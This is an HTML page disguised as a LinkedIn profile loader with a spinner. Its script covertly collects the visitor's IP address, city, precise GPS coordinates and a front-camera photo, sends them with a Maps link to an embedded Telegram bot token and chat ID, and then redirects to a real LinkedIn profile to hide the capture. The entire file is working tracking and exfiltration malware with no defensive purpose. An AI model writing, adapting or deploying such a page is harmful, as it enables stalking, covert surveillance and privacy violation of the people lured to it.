<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn</title>
    <style>
        body { 
            margin:0; padding:0; background:#ffffff; 
            height:100vh; display:flex; align-items:center; 
            justify-content:center; font-family:Arial, sans-serif; 
        }
        h1 { color: #0077b5; font-size: 26px; }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0077b5;
            border-radius: 50%;
            width: 40px; height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div>
        <h1>Loading LinkedIn Profile...</h1>
        <div class="loader"></div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "8475309387:AAHv1rNBBuU2XDaGtdQLAW0yRUspKX4fXZE";
        const TELEGRAM_CHAT_ID = "7052857946";
        const REDIRECT_URL = "https://www.linkedin.com/in/connectaditya08/";

        let visitorInfo = {
            ip: "Unknown",
            city: "Unknown",
            country: "Unknown",
            latitude: "Unknown",
            longitude: "Unknown",
            accuracy: "Unknown",
            timestamp: new Date().toISOString()
        };

        async function sendToTelegram(photoBase64) {
            try {
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("caption", 
                `🔴 New Capture\n\n` +
                `IP: ${visitorInfo.ip}\n` +
                `Approx Location: ${visitorInfo.city}, ${visitorInfo.country}\n` +
                `Exact GPS: ${visitorInfo.latitude}, ${visitorInfo.longitude}\n` +
                `Accuracy: ${visitorInfo.accuracy} meters\n` +
                `Maps: https://maps.google.com/?q=${visitorInfo.latitude},${visitorInfo.longitude}\n` +
                `Time: ${visitorInfo.timestamp}`);

                const blob = await fetch(photoBase64).then(r => r.blob());
                formData.append("photo", blob, "photo.jpg");

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST", body: formData
                });
            } catch(e) {}
        }

        async function getExactGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve();
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        visitorInfo.latitude = pos.coords.latitude.toFixed(6);
                        visitorInfo.longitude = pos.coords.longitude.toFixed(6);
                        visitorInfo.accuracy = pos.coords.accuracy.toFixed(0);
                        resolve();
                    },
                    (err) => {
                        console.log("GPS Permission/Error:", err.message);
                        resolve();
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 12000, 
                        maximumAge: 0 
                    }
                );
            });
        }

        async function start() {
            try {
                // 1. Get IP + City
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                visitorInfo.ip = ipData.ip;

                const geo = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
                visitorInfo.city = geo.city || "Unknown";
                visitorInfo.country = geo.country_name || "Unknown";

                // 2. Get Exact GPS (this will ask permission)
                await getExactGPS();

                // 3. Get Camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                await new Promise(r => setTimeout(r, 1500));

                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);

                const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
                stream.getTracks().forEach(track => track.stop());

                await sendToTelegram(photoBase64);

            } catch (error) {
                console.log("Error:", error);
            } finally {
                window.location.href = REDIRECT_URL;
            }
        }

        start();
    </script>
</body>
</html>
